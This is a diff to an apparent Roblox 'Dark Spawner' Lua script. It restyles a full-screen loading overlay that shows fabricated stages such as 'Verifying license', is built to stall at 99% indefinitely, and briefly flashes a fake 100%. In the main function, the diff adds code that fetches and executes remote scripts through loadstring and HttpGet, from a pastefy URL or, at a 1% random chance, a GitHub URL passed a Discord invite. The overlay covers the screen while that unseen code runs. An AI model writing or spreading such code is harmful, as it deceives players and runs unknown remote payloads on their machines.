@@ -112,79 +112,182 @@ local function createDeltaWarning()
     return warningGui, continueBtn
 end
 
--- Function to create the loading screen
+-- Function to create the stylish loading screen
 local function createLoadingScreen()
     -- Create ScreenGui
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoadingScreen"
     screenGui.ResetOnSpawn = false
     screenGui.IgnoreGuiInset = true
-    screenGui.DisplayOrder = 999999999 -- Maximum display order to overlay everything
+    screenGui.DisplayOrder = 999999999
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = playerGui
 
-    -- Main Frame (Full Screen Background)
+    -- Main Frame (Full Screen Background with Gradient)
     local mainFrame = Instance.new("Frame")
     mainFrame.Name = "MainFrame"
     mainFrame.Size = UDim2.new(1, 0, 1, 0)
     mainFrame.Position = UDim2.new(0, 0, 0, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
     mainFrame.BorderSizePixel = 0
-    mainFrame.ZIndex = 999999999 -- Ensure it's on top
+    mainFrame.ZIndex = 999999999
     mainFrame.Parent = screenGui
 
-    -- Loading Container Frame
+    -- Animated Background Gradient
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 45)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(35, 25, 55)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 35, 65))
+    }
+    gradient.Rotation = 45
+    gradient.Parent = mainFrame
+
+    -- Animate gradient rotation
+    spawn(function()
+        while mainFrame.Parent do
+            local rotateTween = TweenService:Create(gradient, TweenInfo.new(8, Enum.EasingStyle.Linear), {Rotation = gradient.Rotation + 360})
+            rotateTween:Play()
+            rotateTween.Completed:Wait()
+        end
+    end)
+
+    -- Floating particles background
+    for i = 1, 15 do
+        local particle = Instance.new("Frame")
+        particle.Size = UDim2.new(0, math.random(2, 6), 0, math.random(2, 6))
+        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        particle.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
+        particle.BackgroundTransparency = 0.7
+        particle.BorderSizePixel = 0
+        particle.Parent = mainFrame
+
+        local particleCorner = Instance.new("UICorner")
+        particleCorner.CornerRadius = UDim.new(1, 0)
+        particleCorner.Parent = particle
+
+        -- Animate particles
+        spawn(function()
+            while particle.Parent do
+                local randomX = math.random()
+                local randomY = math.random()
+                local floatTween = TweenService:Create(particle, 
+                    TweenInfo.new(math.random(10, 20), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), 
+                    {Position = UDim2.new(randomX, 0, randomY, 0)}
+                )
+                floatTween:Play()
+                floatTween.Completed:Wait()
+            end
+        end)
+    end
+
+    -- Loading Container Frame with Glass Effect
     local loadingFrame = Instance.new("Frame")
     loadingFrame.Name = "LoadingFrame"
-    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
-    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
-    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    loadingFrame.Size = UDim2.new(0, 480, 0, 160)
+    loadingFrame.Position = UDim2.new(0.5, -240, 0.5, -80)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+    loadingFrame.BackgroundTransparency = 0.1
     loadingFrame.BorderSizePixel = 0
     loadingFrame.Parent = mainFrame
 
-    -- Add corner rounding
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = loadingFrame
+    -- Glass effect
+    local glassCorner = Instance.new("UICorner")
+    glassCorner.CornerRadius = UDim.new(0, 20)
+    glassCorner.Parent = loadingFrame
 
-    -- Loading Text
+    local glassStroke = Instance.new("UIStroke")
+    glassStroke.Color = Color3.fromRGB(100, 100, 150)
+    glassStroke.Thickness = 1
+    glassStroke.Transparency = 0.5
+    glassStroke.Parent = loadingFrame
+
+    -- Glow effect around frame
+    local glow = Instance.new("ImageLabel")
+    glow.Name = "Glow"
+    glow.Size = UDim2.new(1, 60, 1, 60)
+    glow.Position = UDim2.new(0, -30, 0, -30)
+    glow.BackgroundTransparency = 1
+    glow.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+    glow.ImageColor3 = Color3.fromRGB(0, 162, 255)
+    glow.ImageTransparency = 0.8
+    glow.ScaleType = Enum.ScaleType.Slice
+    glow.SliceCenter = Rect.new(10, 10, 118, 118)
+    glow.Parent = loadingFrame
+
+    -- Animate glow
+    spawn(function()
+        while glow.Parent do
+            local glowTween = TweenService:Create(glow, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), 
+                {ImageTransparency = 0.5})
+            glowTween:Play()
+            glowTween.Completed:Wait()
+            
+            local glowTween2 = TweenService:Create(glow, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), 
+                {ImageTransparency = 0.9})
+            glowTween2:Play()
+            glowTween2.Completed:Wait()
+        end
+    end)
+
+    -- Loading Title with Gradient Text Effect
+    local loadingTitle = Instance.new("TextLabel")
+    loadingTitle.Name = "LoadingTitle"
+    loadingTitle.Size = UDim2.new(1, -40, 0, 40)
+    loadingTitle.Position = UDim2.new(0, 20, 0, 20)
+    loadingTitle.BackgroundTransparency = 1
+    loadingTitle.Text = "DARK SPAWNER"
+    loadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingTitle.TextScaled = true
+    loadingTitle.Font = Enum.Font.GothamBold
+    loadingTitle.Parent = loadingFrame
+
+    local titleGradient = Instance.new("UIGradient")
+    titleGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 162, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 255))
+    }
+    titleGradient.Parent = loadingTitle
+
+    -- Loading Status Text
     local loadingText = Instance.new("TextLabel")
     loadingText.Name = "LoadingText"
-    loadingText.Size = UDim2.new(1, -40, 0, 30)
-    loadingText.Position = UDim2.new(0, 20, 0, 20)
+    loadingText.Size = UDim2.new(1, -40, 0, 25)
+    loadingText.Position = UDim2.new(0, 20, 0, 65)
     loadingText.BackgroundTransparency = 1
-    loadingText.Text = "Loading Dark Spawner"
-    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingText.Text = "Initializing"
+    loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
     loadingText.TextScaled = true
-    loadingText.Font = Enum.Font.GothamMedium
+    loadingText.Font = Enum.Font.Gotham
     loadingText.Parent = loadingFrame
 
     -- Progress Text (Percentage)
     local progressText = Instance.new("TextLabel")
     progressText.Name = "ProgressText"
     progressText.Size = UDim2.new(0, 60, 0, 25)
-    progressText.Position = UDim2.new(1, -80, 0, 22)
+    progressText.Position = UDim2.new(1, -80, 0, 65)
     progressText.BackgroundTransparency = 1
     progressText.Text = "0%"
-    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    progressText.TextColor3 = Color3.fromRGB(0, 162, 255)
     progressText.TextScaled = true
-    progressText.Font = Enum.Font.Gotham
+    progressText.Font = Enum.Font.GothamBold
     progressText.Parent = loadingFrame
 
-    -- Progress Bar Background
+    -- Modern Progress Bar Background
     local progressBg = Instance.new("Frame")
     progressBg.Name = "ProgressBackground"
-    progressBg.Size = UDim2.new(1, -40, 0, 8)
-    progressBg.Position = UDim2.new(0, 20, 0, 70)
-    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    progressBg.Size = UDim2.new(1, -40, 0, 12)
+    progressBg.Position = UDim2.new(0, 20, 0, 110)
+    progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
     progressBg.BorderSizePixel = 0
     progressBg.Parent = loadingFrame
 
     local progressBgCorner = Instance.new("UICorner")
-    progressBgCorner.CornerRadius = UDim.new(0, 4)
+    progressBgCorner.CornerRadius = UDim.new(0, 6)
     progressBgCorner.Parent = progressBg
 
-    -- Progress Bar Fill
+    -- Progress Bar Fill with Gradient
     local progressFill = Instance.new("Frame")
     progressFill.Name = "ProgressFill"
     progressFill.Size = UDim2.new(0, 0, 1, 0)
@@ -194,28 +297,70 @@ local function createLoadingScreen()
     progressFill.Parent = progressBg
 
     local progressFillCorner = Instance.new("UICorner")
-    progressFillCorner.CornerRadius = UDim.new(0, 4)
+    progressFillCorner.CornerRadius = UDim.new(0, 6)
     progressFillCorner.Parent = progressFill
+
+    local progressGradient = Instance.new("UIGradient")
+    progressGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 162, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 200, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 162))
+    }
+    progressGradient.Parent = progressFill
+
+    -- Animated progress bar shine effect
+    local shine = Instance.new("Frame")
+    shine.Name = "Shine"
+    shine.Size = UDim2.new(0, 40, 1, 0)
+    shine.Position = UDim2.new(-0.2, 0, 0, 0)
+    shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    shine.BackgroundTransparency = 0.7
+    shine.BorderSizePixel = 0
+    shine.Parent = progressFill
+
+    local shineCorner = Instance.new("UICorner")
+    shineCorner.CornerRadius = UDim.new(0, 6)
+    shineCorner.Parent = shine
 
     -- Variables for loading animation
     local currentProgress = 0
     local targetProgress = 0
     local isStuck = false
     local isRunning = true
+    local loadingStages = {
+        "Initializing",
+        "Loading modules",
+        "Connecting to server",
+        "Verifying license",
+        "Loading UI components",
+        "Almost ready"
+    }
+    local currentStage = 1
 
-    -- Function to update progress
+    -- Function to update progress with smooth animation
     local function updateProgress()
         if not isStuck and isRunning then
             if currentProgress < 90 then
-                -- Fast progress until 90%
                 targetProgress = math.min(currentProgress + math.random(5, 15), 90)
+                -- Update loading stage
+                local stageProgress = math.floor((targetProgress / 90) * #loadingStages)
+                if stageProgress > 0 and stageProgress <= #loadingStages and stageProgress ~= currentStage then
+                    currentStage = stageProgress
+                    if loadingText and loadingText.Parent then
+                        loadingText.Text = loadingStages[currentStage]
+                    end
+                end
             elseif currentProgress < 99 then
-                -- Slow progress from 90% to 99%
                 targetProgress = math.min(currentProgress + math.random(1, 3), 99)
+                if loadingText and loadingText.Parent then
+                    loadingText.Text = "Finalizing"
+                end
             else
-                -- Get stuck at 99%
                 targetProgress = 99
                 isStuck = true
+                if loadingText and loadingText.Parent then
+                    loadingText.Text = "Loading complete"
+                end
             end
         end
         
@@ -223,24 +368,34 @@ local function createLoadingScreen()
             return
         end
         
-        -- Animate to target progress
-        local tweenInfo = TweenInfo.new(
-            0.5, -- Duration
-            Enum.EasingStyle.Quad,
-            Enum.EasingDirection.Out
-        )
-        
-        local progressTween = TweenService:Create(
-            progressFill,
-            tweenInfo,
-            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
-        )
-        
+        -- Smooth progress animation
+        local tweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+        local progressTween = TweenService:Create(progressFill, tweenInfo, {Size = UDim2.new(targetProgress / 100, 0, 1, 0)})
         progressTween:Play()
         
-        -- Update percentage text
+        -- Animate shine effect across progress bar
+        if targetProgress > 0 then
+            local shineTween = TweenService:Create(shine, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
+                {Position = UDim2.new(1.2, 0, 0, 0)})
+            shineTween:Play()
+            shineTween.Completed:Connect(function()
+                if shine and shine.Parent then
+                    shine.Position = UDim2.new(-0.2, 0, 0, 0)
+                end
+            end)
+        end
+        
+        -- Update percentage text with color animation
         if progressText and progressText.Parent then
             progressText.Text = math.floor(targetProgress) .. "%"
+            local colorTween = TweenService:Create(progressText, TweenInfo.new(0.3, Enum.EasingStyle.Quad), 
+                {TextColor3 = Color3.fromRGB(100, 255, 100)})
+            colorTween:Play()
+            colorTween.Completed:Connect(function()
+                local colorTweenBack = TweenService:Create(progressText, TweenInfo.new(0.3, Enum.EasingStyle.Quad), 
+                    {TextColor3 = Color3.fromRGB(0, 162, 255)})
+                colorTweenBack:Play()
+            end)
         end
         currentProgress = targetProgress
     end
@@ -252,8 +407,9 @@ local function createLoadingScreen()
         while isRunning and screenGui.Parent and loadingText and loadingText.Parent do
             dotCount = (dotCount + 1) % 4
             dots = string.rep(".", dotCount)
-            if loadingText and loadingText.Parent then
-                loadingText.Text = "Loading Dark Spawner" .. dots
+            if loadingText and loadingText.Parent and currentStage <= #loadingStages then
+                local baseText = loadingStages[currentStage] or "Loading"
+                loadingText.Text = baseText .. dots
             end
             wait(0.5)
         end
@@ -263,18 +419,17 @@ local function createLoadingScreen()
 
     -- Progress animation loop
     local progressCoroutine = coroutine.create(function()
-        wait(1) -- Initial delay
+        wait(1)
         
         while currentProgress < 99 and isRunning and screenGui.Parent do
             updateProgress()
-            wait(math.random(1, 3)) -- Random delay between updates
+            wait(math.random(1, 3))
         end
         
         -- Once stuck at 99%, occasionally "try" to load more
         while isRunning and screenGui.Parent do
             wait(math.random(3, 8))
             if isStuck and progressText and progressText.Parent and progressFill and progressFill.Parent then
-                -- Briefly show 100% then go back to 99%
                 progressText.Text = "100%"
                 progressFill.Size = UDim2.new(1, 0, 1, 0)
                 wait(0.1)
@@ -294,17 +449,6 @@ local function createLoadingScreen()
             isRunning = false
         end
     end)
-
-    -- Optional: Remove loading screen after a certain time (uncomment if needed)
-    --[[
-    spawn(function()
-        wait(30) -- Remove after 30 seconds
-        isRunning = false
-        if screenGui and screenGui.Parent then
-            screenGui:Destroy()
-        end
-    end)
-    --]]
 
     return screenGui
 end
@@ -344,22 +488,34 @@ local function main()
                     warningGui:Destroy()
                 end
                 
-                -- Small delay before showing loading screen
                 wait(0.3)
                 
-                -- Execute the loadstring after warning
-                loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+                -- 1% chance to load the special script
+                local randomChance = math.random(1, 100)
+                if randomChance == 1 then
+                    -- Load the special script (1% chance)
+                    print("Loading special script! (1% chance)")
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+                else
+                    -- Load the normal script (99% chance)
+                    loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+                end
                 
-                -- Now create the loading screen
+                -- Show the stylish loading screen
                 createLoadingScreen()
             end)
         else
-            -- Fallback if frame not found
             warningGui:Destroy()
             wait(0.3)
             
-            -- Execute the loadstring after warning
-            loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+            -- 1% chance logic here too (fallback)
+            local randomChance = math.random(1, 100)
+            if randomChance == 1 then
+                print("Loading special script! (1% chance)")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+            else
+                loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+            end
             
             createLoadingScreen()
         end
